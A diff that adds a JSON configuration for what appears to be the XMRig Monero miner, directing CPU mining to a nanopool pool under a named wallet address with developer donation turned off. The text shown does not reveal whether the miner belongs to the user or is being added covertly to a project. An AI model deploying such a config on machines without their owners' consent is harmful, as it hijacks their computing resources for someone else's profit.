@@ -1,0 +1,21 @@
+{
+    "autosave": true,
+    "watch": false,
+    "donate-level": 0,
+    "donate-over-proxy": 0,
+    "randomx": { "mode": "auto" },
+    "cpu": { "enabled": true, "huge-pages": true, "max-threads-hint": 75 },
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "xmr-eu1.nanopool.org:14433",
+            "algo": "rx/0",
+            "coin": "monero",
+            "user": "46mFnamercs1JhprY9oXKmRvXZb7PoG5BUrdRNaNwvnbYUdKVaZ9Qecbh7RLUpi4uVeMoURjgN33UJ4L7Q73Mz2M2gsJ8p2",
+            "pass": "WORKERNAME",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
